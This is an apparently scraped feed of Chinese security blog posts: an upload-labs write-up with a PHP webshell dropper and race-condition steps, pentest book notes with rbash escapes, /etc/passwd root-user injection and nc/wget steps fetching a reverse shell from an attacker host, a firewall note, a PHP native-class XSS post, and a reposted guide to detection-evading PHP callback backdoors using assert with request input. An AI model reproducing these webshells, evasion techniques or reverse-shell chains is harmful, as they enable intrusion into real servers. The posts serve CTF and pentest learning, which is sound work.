class="string">&#x27;./pass17.png&#x27;</span>)<span class="comment">;</span></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd执行php payload<span class="number">.</span>php  file<span class="number">.</span>png</span><br><span class="line">paylod<span class="number">.</span>php是写有以上代码的文件</span><br><span class="line">file<span class="number">.</span>png是随意一张png图片</span><br><span class="line">pass17<span class="number">.</span>png是生成的图片</span><br></pre></td></tr></table></figure>
<p>png图片上传后利用文件包含漏洞传 post 参数，同时GET：&amp;0=phpinfo</p>
<h1 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h1><h2 id="考察点-条件竟争绕过"><a href="#考察点-条件竟争绕过" class="headerlink" title="考察点 条件竟争绕过"></a>考察点 条件竟争绕过</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同的请求时是并发进行的，因此如果并发处理不当或相关操作顺序设计的不合理时，将会导致此类问题的发生。</span><br><span class="line"></span><br><span class="line">上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除</span><br><span class="line"></span><br><span class="line">由于服务器并发处理(同时)多个请求，假如a用户上传了木马文件，由于代码执行需要时间，在此过程中b用户访问了a用户上传的文件，会有以下三种情况：</span><br><span class="line"><span class="number">1</span>.访问时间点在上传成功之前，没有此文件</span><br><span class="line"><span class="number">2</span>.访问时间点在刚上传成功但还没有进行判断，该文件存在</span><br><span class="line"><span class="number">3</span>.访问时间点在判断之后，文件被删除，没有此文件</span><br><span class="line"></span><br><span class="line">可通过bp的intruder模块大量发送上传文件数据包，再新开一个intruder模块大量接受访问此文件的数据包，会出现一些执行成功的结果</span><br><span class="line">永久：</span><br><span class="line">执行成功时，通过代码写入一个文件，文件里写入木马， 之后重复临时的步骤，执行成功时就会将带有木马的文件写入</span><br><span class="line"></span><br><span class="line">原文链接：https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/wsnbbz/</span>article<span class="regexp">/details/</span><span class="number">104651408</span>/</span><br></pre></td></tr></table></figure>
<p>创建一个shell.php文件，里边内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;shell_pass18.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&#x27;&lt;?php @eval($_POST[value]); echo &quot;i am&quot;;?&gt;&#x27;</span>;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传抓包，发包到intruder, Clear,Add变量a(自己加的）,</p>
<p>Playload type:Numbers</p>
<p>From:1 ,To:11111</p>
<p>打开浏览器页面<a href="http://127.0.0.1/upload-labs/upload/shell.php">http://127.0.0.1/upload-labs/upload/shell.php</a></p>
<p>start attack</p>
<p>疯狂刷新，看到有页面一闪而过就可以了</p>
<p>然后访问<a href="http://127.0.0.1/upload-labs/upload/shell_pass18.php">http://127.0.0.1/upload-labs/upload/shell_pass18.php</a></p>
<p>成功，蚁剑连接</p>
<h1 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h1><p>同上</p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>《脑洞大开：渗透测试另类实战攻略》读书笔记</title>
    <url>/2023/09/22/%E3%80%8A%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%8F%A6%E7%B1%BB%E5%AE%9E%E6%88%98%E6%94%BB%E7%95%A5%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>《脑洞大开：渗透测试另类实战攻略》读书笔记</p>
<a id="more"></a>

<h1 id="第一章：欢迎，年轻的勇士：准备工作"><a href="#第一章：欢迎，年轻的勇士：准备工作" class="headerlink" title="第一章：欢迎，年轻的勇士：准备工作"></a>第一章：欢迎，年轻的勇士：准备工作</h1><h2 id="nmap常用命令"><a href="#nmap常用命令" class="headerlink" title="nmap常用命令"></a>nmap常用命令</h2><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">nmap</span> -sC -sV -v -A 目标主机<span class="built_in">ip</span></span><br></pre></td></tr></table></figure>
<p>其中，-sC、 -sV、 -V、 -A这四个参数的含义如下:</p>
<ul>
<li>-sC: 根据端口识别服务自动调用默认脚本，即nmap将根据识别到的具体服务自动使用对<br>应的默认脚本检测服务详情。</li>
<li>-sV: 扫描目标主机的端口和软件版本，即nmap将在探测端口的基础上继续对版本信息进<br>行探测。</li>
<li>-v: 输出详细信息，通过该参数我们将实时获得探测过程中的进度等详细信息。</li>
<li>-A: 综合扫描，包含基于1~ 10000的端口进行ping扫描、操作系统扫描、脚本扫描、路由跟踪和服务探测等。</li>
</ul>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>kali自带强大字典</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">在Kali中此文件所在的路径为</span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>dirbuster/xxxxxx</span><br></pre></td></tr></table></figure>


<h2 id="文件传输操作"><a href="#文件传输操作" class="headerlink" title="文件传输操作"></a>文件传输操作</h2><p>开http服务</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -m SinpleHTTPServer <span class="number">80</span></span><br></pre></td></tr></table></figure>
<p>wget下载</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget http:<span class="regexp">//</span><span class="number">10</span>.xxx.xxx.xxx/shell.sh</span><br></pre></td></tr></table></figure>


<h1 id="第二章：新手村：从Kioptrix开始"><a href="#第二章：新手村：从Kioptrix开始" class="headerlink" title="第二章：新手村：从Kioptrix开始"></a>第二章：新手村：从Kioptrix开始</h1><h2 id="Point-1（80-443）"><a href="#Point-1（80-443）" class="headerlink" title="Point 1（80/443）"></a>Point 1（80/443）</h2><p>对于开放开80和443端口的IP，要分别访问80和443端口</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">    小贴士:相信有不少人会误以为https服务所提供的站点内容与当前主机http服务所提供的</span><br><span class="line">相同。实际上，在很多情况下，它们所提供的站点内容并不一样，因此在进行渗透测试时应针对</span><br><span class="line">它们分别进行测试。类似地， 一个<span class="built_in">IP</span>下可以运行多个站点，通过<span class="built_in">IP</span>访问和通过域名访问获得的结</span><br><span class="line">果也可能不尽相同，所以应分别留意。</span><br></pre></td></tr></table></figure>


<h2 id="Point-2（Exploit-Database）"><a href="#Point-2（Exploit-Database）" class="headerlink" title="Point 2（Exploit Database）"></a>Point 2（Exploit Database）</h2><p>过时的中间件、服务版本，可能会存在漏洞，可在Exploit Database进行检索</p>
<h2 id="Point-3（LinEnum）"><a href="#Point-3（LinEnum）" class="headerlink" title="Point 3（LinEnum）"></a>Point 3（LinEnum）</h2><p>getshell之后可通过linux提权辅助工具LinEnum进行提权</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">LinEnum 是一个 Linux 主机本地信息自动提取的 shell 脚本，它有超过 <span class="number">65</span> 项安全检查功能，比如潜在的 SUID<span class="regexp">/GUID 文件、Sudo/</span>rhost 错误配置等。</span><br></pre></td></tr></table></figure>


<h2 id="Point-5（linux写权限）"><a href="#Point-5（linux写权限）" class="headerlink" title="Point 5（linux写权限）"></a>Point 5（linux写权限）</h2><p>提权需要在目标主机本地系统中选择一个我们拥有写权限的目录，<strong>Linux 下常用的相关目录</strong><br><strong>有/tmp/目录以及/dev/shm/目录等</strong></p>
<h2 id="Point-6（rbash）"><a href="#Point-6（rbash）" class="headerlink" title="Point 6（rbash）"></a>Point 6（rbash）</h2><p>rbash</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">小贴士: rbash是一种功能受限的<span class="keyword">bash </span><span class="keyword">shell,即它可以执行的命令被人为限制了，只有特</span></span><br><span class="line"><span class="keyword">定几种，也就是说，rbash是一 </span>种白名单限制<span class="keyword">shell,使用rbash </span>登录的用户只允许使用管理员预</span><br><span class="line">先设定好的命令，可见rbash的权限很低。如果rbash中限定的命令种类设置存在疏忽，就可能</span><br><span class="line">导致恶意攻击者可以利用某些被错误允许执行的命令运行出一个不受限的<span class="keyword">bash </span><span class="keyword">shell,该操作被</span></span><br><span class="line"><span class="keyword">成为rbash逃逸</span></span><br></pre></td></tr></table></figure>
<p>在rbash中输入“?” ，会获得当前shell允许执行的所有命令列表</p>
<p><img src="https://img.npfs06.top/20230922161952.png"></p>
<p>在rbash中，如果遇到了如下常见的命令被允许执行，就可以直接凭借对应的构造命令成功地实现rbash逃逸。换言之，如果想设置一个相对安全的rbash环境，以下命令不应该轻易被允许使用。</p>
<ul>
<li>针对<code>ftp</code>、<code>more</code>、<code>less</code>、<code>man</code>、<code>vi</code>、<code>vim</code>，可在输入点输入<code>！/bin/sh</code>或<code>！/bin/bash</code>命令实现逃逸。</li>
<li><code>awk</code>可以使用<code>awk &#39;BEGIN&#123;system(&quot;/bin/sh&quot;)&#125;&#39;</code>或<code>awk &#39;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code>。</li>
<li> <code>find</code>命令可以通过输入<code>find/-name SomeName-exec/bin/sh\；</code>和<code>find/-name SomeName-exec/bin/bash\；</code>实现逃逸。</li>
<li> Python可以使用<code>python-c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39;</code>命令实现逃逸。</li>
<li> php可以使用<code>php-a then exec(&quot;sh-i&quot;)；</code>命令实现逃逸。</li>
<li> Perl可以使用<code>perl-e &#39;exec&quot;/bin/sh&quot;;&#39;</code>命令实现逃逸。</li>
<li> lua可以使用<code>os.execute（&#39;/bin/sh&#39;）</code>命令实现逃逸。</li>
<li> ruby可以使用<code>exec&quot;/bin/sh&quot;</code>命令实现逃逸。</li>
</ul>
<p>这里只罗列了常见的部分，若想获得更多信息，建议进一步学习如下资料。<br>《Linux Restricted Shell Bypass》：<a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf%E3%80%82">https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf。</a></p>
<h2 id="Point-7-（sudo）"><a href="#Point-7-（sudo）" class="headerlink" title="Point 7 （sudo）"></a>Point 7 （sudo）</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">小贴士: sudo是Linux系统下的管理指令，普通用户可以通过sudo命令以root权限执行管理员设定的几</span><br><span class="line">个或全部程序。设定不同，每个用户被允许使用sudo执行的命令种类和数量也不同。用户可以通过sudo -l命令查看当前用户被允许使用的程序列表。此外，有些用户在使用sudo -l命令的时候也需要提供当前用户的密码，这是因为管理员对用户的设置不同。如果需要密码，那么对于使用反弹<span class="keyword">shell</span><span class="bash">获得的用户身份而言，可能就无法直接查看和使用sudo命令了。</span></span><br></pre></td></tr></table></figure>
<h2 id="Point-8-改用户提权"><a href="#Point-8-改用户提权" class="headerlink" title="Point 8 (改用户提权)"></a>Point 8 (改用户提权)</h2><p>拥有修改敏感文件的权限时（比如sudo ht），我们可以直接在<code>/etc/passwd</code>文件中新增用户，并且把密码直接写在/etc/passwd文件里。</p>
<p>例如：<br><img src="https://img.npfs06.top/20230922155015.png"></p>
<p>上述内容将创建一个用户名为rootwe,密码为toor的root用户。文中密码toor的密文sXuCKi7k3Xh/s是通过如下命令获得的:</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">openssl passwd -crypt toor</span></span><br></pre></td></tr></table></figure>
<p>也可以编辑<code>/etc/shadow</code>文件，将root账号的密码清空，保存退出后，然后执行su root命令即可无须密码切换到root用户</p>
<p><img src="https://img.npfs06.top/20230922160336.png"></p>
<p>也可以编辑<code>/etc/sudoers</code>文件，该文件包含了每个用户可以在不输入密码的情况下使用sudo命令的范围，即执行sudo -l命令时获得的输出结果。可以直接修改该文件给当前的低权限用户添加无须使用密码执行sudo /bash命令的权限。</p>
<h2 id="Point-9（sqlmap）"><a href="#Point-9（sqlmap）" class="headerlink" title="Point 9（sqlmap）"></a>Point 9（sqlmap）</h2><p>跑sqlmap的时候可以设置下<code>--level</code>或者<code>--risk</code></p>
<h2 id="Point-10-httpserver"><a href="#Point-10-httpserver" class="headerlink" title="Point 10 (httpserver)"></a>Point 10 (httpserver)</h2><p>有的时候会遇到这样一个问题，使用<code>python -m SimpleHTTPServer 80</code>命令开启http服务，但是目标主机系统中的wget命令将无法连接成功。这是因为该主机设置了策略，禁止连接远程主机的80端口，这时会出现如下图所示的连接等待界面。</p>
<p><img src="https://img.npfs06.top/20230922164722.png"></p>
<p>而如果在Kali系统中换一个端口开启SimpleHTTPServer，则可以成功绕过上述连接限制。本例中使用如下命令将SimpleHTTPServer改在8882端口开放。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -m SinpleHTTPServer <span class="number">8882</span></span><br></pre></td></tr></table></figure>
<p>之后在目标主机系统上使用wget命令访问Kali系统的8882端口下载文件，就不会再受连接限制影响了</p>
<p><img src="https://img.npfs06.top/20230922164817.png"></p>
<h2 id="Point-11-Apache的默认安装路径"><a href="#Point-11-Apache的默认安装路径" class="headerlink" title="Point 11 (Apache的默认安装路径)"></a>Point 11 (Apache的默认安装路径)</h2><p>Apache官方提供了一个名为DistrosDefaultLayout的站点，链接如下：</p>
<p><a href="https://cwiki.apache.org/confluence/display/HTTPD/DistrosDefaultLayout%E3%80%82">https://cwiki.apache.org/confluence/display/HTTPD/DistrosDefaultLayout。</a><br>上述站点提供了Linux各版本系统下Apache的默认安装路径</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">当<span class="keyword">nmap</span>扫描出来的某端口无法访问时，如果条件允许，可以通过Apache中间件的主配置文件httpd.<span class="keyword">conf</span>来查找原因。比如存在目录穿越漏洞时，可通过上诉网站查找路径后配合漏洞进行读取</span><br></pre></td></tr></table></figure>
<h2 id="Point-12-（nc传输文件）"><a href="#Point-12-（nc传输文件）" class="headerlink" title="Point 12 （nc传输文件）"></a>Point 12 （nc传输文件）</h2><p>Kali系统自带shell文件php_reverse_shell.php，它默认位于<code>/usr/share/webshells/php</code>目录。使用该文件时，首先要将其内部的反弹IP和端口更改为目前Kali系统实际使用的IP以及准备监听反弹shell的端口。</p>
<p><strong>使用nc传输文件</strong></p>
<p>攻击机：192.168.192.134<br>目标机器：192.168.192.135</p>
<p>当目标机器存在远程命令执行漏洞，但发现该目标主机系统限制使用nc的-e命令参数，这导致远程连接无法交互，输入任何命令都会直接断开连接。此外，由于目标主机本地没有bash、Python等程序，因此也导致相关反弹shell方法均不可用。这时使用文件写入方法，利用echo命令写入“一句Webshell”，获得一个可以回显的远程命令执行方式。</p>
<p><strong>虽然目标主机对nc -e命令进行了限制，但nc传输文件时无须使用-e参数。因此可以借助“一句话Webshell”使用nc上传shell文件。具体操作如下：</strong></p>
<p>1、利用“一句话Webshell”构建如下链接：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">192.135</span>:<span class="number">8080</span><span class="regexp">/phptax/</span>shell.php?cmd=nc <span class="number">192.168</span>.<span class="number">192.134</span> <span class="number">8888</span> &gt;reverse_shell.php</span><br></pre></td></tr></table></figure>
<p>该链接中包含的命令将通过nc向192.168.192.134主机的8888端口发起连接请求，并且会将获得的返回数据保存为本地reverse_shell.php。访问上述链接前，在Kali系统的php_reverse_shell.php文件所在的目录下执行如下命令：</p>
<p><img src="https://img.npfs06.top/20230922172510.png"></p>
<p>该命令将通过nc监听8888端口。当该端口被访问时，nc会将本地php_reverse_shell.php的文件内容提供给对方。通过在Kali系统以及目标主机分别完成上述操作，就可以成功使用nc实现文件传输，最终的传输结果将保存在目标主机Web目录的reverse_shell.php中。<br>完成上述操作后，使用nc命令重新监听8888端口。</p>
<p>最后通过浏览器访问链接<code>http://192.168.192.135:8080/xxxxx/reverse_shell.php</code>即可触发反弹shell的执行。</p>
<h1 id="第三章-过时即风险：综合技能的扩展与提升"><a href="#第三章-过时即风险：综合技能的扩展与提升" class="headerlink" title="第三章 过时即风险：综合技能的扩展与提升"></a>第三章 过时即风险：综合技能的扩展与提升</h1><h2 id="Point-1-windows传文件"><a href="#Point-1-windows传文件" class="headerlink" title="Point 1 (windows传文件)"></a>Point 1 (windows传文件)</h2><p>在Linux系统下可以使用的wget、curl等命令在Windows系统下往往都是失效的，因而需要另辟蹊径，比较常用的方法包括<strong>smb文件共享</strong>以及<strong>使用powershell中的DownloadFile()函数</strong>，这里以后者为例进行讲解，smb文件共享方式在后续的实践将单独说明。<br>利用powershell的DownloadFile()函数下载文件到本地Windows主机的命令格式如下。</p>
<p><img src="https://img.npfs06.top/20230925143953.png"></p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
  </entry>
  <entry>
    <title>关于端口无法访问的问题的排查过程</title>
    <url>/2021/04/16/%E5%85%B3%E4%BA%8E%E7%AB%AF%E5%8F%A3%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E7%9A%84%E9%97%AE%E9%A2%98%E7%9A%84%E6%8E%92%E6%9F%A5%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p>关于端口无法访问的问题的排查过程，自己有台服务器无法反弹shell，在CTF中做到像反弹shell这类涉及到VPS的题目，<del>（懒的排查）</del>我都是拿另一台可以反弹的VPS做的<a id="more"></a></p>
<p>趁着闲的无聊，抽空看了下 （这里以23180端口为例）</p>
<p>一下排查，均在开启http.server的前提下</p>
<blockquote>
<p>python3 -m http.server 23180</p>
</blockquote>
<h1 id="阿里云安全组"><a href="#阿里云安全组" class="headerlink" title="阿里云安全组"></a>阿里云安全组</h1><p><img src="https://img.npfs06.top/20210416173728.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>阿里云安全组是成功配置了的</p>
<h1 id="BT端口"><a href="#BT端口" class="headerlink" title="BT端口"></a>BT端口</h1><p><img src="https://img.npfs06.top/20210416174053.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>宝塔端口也是正常开启的，但是还是无法成功访问端口</p>
<h1 id="firewall"><a href="#firewall" class="headerlink" title="firewall"></a>firewall</h1><p>最终原因是被firewall给拦截了</p>
<p>这里记录几个常见命令</p>
<p><strong>linux下安装firewall-cmd</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install firewalld</span><br></pre></td></tr></table></figure>


<p><strong>查看开放的端口</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd  --list-all</span><br></pre></td></tr></table></figure>
<p>会得到如下图，其中<strong>ports</strong>为开放的端口，可以看到23180端口没有开放</p>
<p><img src="https://img.npfs06.top/20210416174440.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>开放端口（比如开放23180）</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --add-port=23180/tcp --permanent</span><br><span class="line">firewall-cmd --reload   //重启</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210416174550.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这个时候23180端口已经可以访问了，排查结束</p>
<p><strong>关闭端口</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --remove-port=23180/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>problems</category>
      </categories>
  </entry>
  <entry>
    <title>关于如何利用php的原生类进行XSS</title>
    <url>/2020/07/27/%E5%85%B3%E4%BA%8E%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8php%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB%E8%BF%9B%E8%A1%8CXSS/</url>
    <content><![CDATA[<p>在CTF中，这一类型的题目一般会在代码中给出反序列化点，但是却找不到pop链<a id="more"></a></p>
<h1 id="关于如何利用php的原生类进行XSS"><a href="#关于如何利用php的原生类进行XSS" class="headerlink" title="关于如何利用php的原生类进行XSS"></a>关于如何利用php的原生类进行XSS</h1><p>类似于<code>[BJDCTF 2nd]xss之光</code>这一题，通过GitHack下载代码后，发现如下：</p>
<p><img src="https://img.npfs06.top/20210326210034.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>我们可以看到题目代码给出了反序列化点，却没有给出pop链，这个时候就可以考虑到利用php的原生类进行XSS</p>
<hr>
<p>我们首先需要了解一下PHP序列化及其反序列化的魔术方法</p>
<p><strong>__ toString __：当对象被当作一个字符串使用时候调用(不仅仅是echo的时候，比如file_exists()判断也会触发)</strong></p>
<p>这里主要讲两个Php的内置类：Error和Exception</p>
<h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><p>适用于php7版本</p>
<p>Error类是php的一个内置类，用于自动自定义一个Error，因为它内置有一个toString的方法，在php7的环境下可能会造成一个xss漏洞。</p>
<p>利用方法：</p>
<p><img src="https://img.npfs06.top/20210326210053.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326210101.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326210114.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>我们可以看到成功执行了我们构造的恶意代码</p>
<h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><p>适用于php5、7版本</p>
<p>这个类利用的方式和原理和Error 类相同，只是适用范围更广</p>
<p>利用方法：</p>
<p><img src="https://img.npfs06.top/20210326210121.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326210128.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326210153.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以看到恶意代码同样被执行了</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>创造tips的秘籍--PHP回调后门</title>
    <url>/2020/10/18/%E5%88%9B%E9%80%A0tips%E7%9A%84%E7%A7%98%E7%B1%8D-PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8/</url>
    <content><![CDATA[<p>转载自<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
<a id="more"></a>

<p>最近很多人分享一些过狗过盾的一句话，但无非是用各种方法去构造一些动态函数，比如<code>$_GET[&#39;func&#39;]($_REQUEST[&#39;pass&#39;])</code>之类的方法。万变不离其宗，但这种方法，虽然狗盾可能看不出来，但人肉眼其实很容易发现这类后门的。</p>
<p>那么，我就分享一下，一些不需要动态函数、不用eval、不含敏感函数、免杀免拦截的一句话。</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有很多朋友喜欢收藏一些tips，包括我也收藏了好多tips，有时候在渗透和漏洞挖掘过程中很有用处。</p>
<p>一句话的tips相信很多朋友也收集过好多，过狗一句话之类的。14年11月好像在微博上也火过一个一句话，当时也记印象笔记里了：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201506/51631434650097.png"><img src="https://www.leavesongs.com/content/uploadfile/201506/thum-51631434650097.png" alt="QQ20150619-2@2x.png"></a></p>
<p>最近又看到有人在发这个：<a href="http://www.secoff.net/archives/436.html">http://www.secoff.net/archives/436.html</a></p>
<p>有同学收集tips，就有同学创造tips。那么我们怎么来创造一些过狗、过D盾、无动态函数、无危险函数（无特征）的一句话（后门）？</p>
<p>根据上面这个pdo的一句话，我就可以得到一个很具有普适性的结论：<strong>php中包含回调函数参数的函数，具有做后门的潜质。</strong></p>
<p>我就自己给这类webshell起了个名字：回调后门。</p>
<h2 id="回调后门的老祖宗"><a href="#回调后门的老祖宗" class="headerlink" title="回调后门的老祖宗"></a>回调后门的老祖宗</h2><p>php中call_user_func是执行回调函数的标准方法，这也是一个比较老的后门了：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">call<span class="constructor">_user_func(&#x27;<span class="params">assert</span>&#x27;, $<span class="params">_REQUEST</span>[&#x27;<span class="params">pass</span>&#x27;])</span>;</span><br></pre></td></tr></table></figure>
<p>assert直接作为回调函数，然后<code>$_REQUEST[&#39;pass&#39;]</code>作为assert的参数调用。</p>
<p>这个后门，狗和盾都可以查到（但是狗不会拦截）：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/77661437152543.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-77661437152543.png" alt="QQ20150718-1@2x.png"></a></p>
<p>可php的函数库是很丰富的，只要简单改下函数安全狗就不杀了：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">call<span class="constructor">_user_func_array(&#x27;<span class="params">assert</span>&#x27;, <span class="params">array</span>($<span class="params">_REQUEST</span>[&#x27;<span class="params">pass</span>&#x27;])</span>);</span><br></pre></td></tr></table></figure>
<p>call_user_func_array函数，和call_user_func类似，只是第二个参数可以传入参数列表组成的数组。如图：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/e93e1437153698.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-e93e1437153698.png" alt="QQ20150718-2@2x.png"></a></p>
<p>可见，虽然狗不杀了，D盾还是聪明地识别了出来。</p>
<p>看来，这种传统的回调后门，已经被一些安全厂商盯上了，存在被查杀的风险。</p>
<h2 id="数组操作造成的单参数回调后门"><a href="#数组操作造成的单参数回调后门" class="headerlink" title="数组操作造成的单参数回调后门"></a>数组操作造成的单参数回调后门</h2><p>进一步思考，在平时的php开发中，遇到过的带有回调参数的函数绝不止上面说的两个。这些含有回调（callable类型）参数的函数，其实都有做“回调后门”的潜力。</p>
<p>我最早想到个最“简单好用的”：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>],);</span><br><span class="line">array_filter(<span class="variable">$arr</span>, base64_decode(<span class="variable">$e</span>));</span><br></pre></td></tr></table></figure>
<p>array_filter函数是将数组中所有元素遍历并用指定函数处理过滤用的，如此调用（此后的测试环境都是开着狗的，可见都可以执行）：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/d3881437155040.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-d3881437155040.png" alt="QQ20150718-5@2x.png"></a></p>
<p>这个后门，狗查不出来，但D盾还是有感应，报了个等级3（显然比之前的等级4要低了）：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/f71d1437155038.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-f71d1437155038.png" alt="QQ20150718-4@2x.png"></a></p>
<p>类似array_filter，array_map也有同样功效：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>],);</span><br><span class="line">array_map(base64_decode(<span class="variable">$e</span>), <span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure>
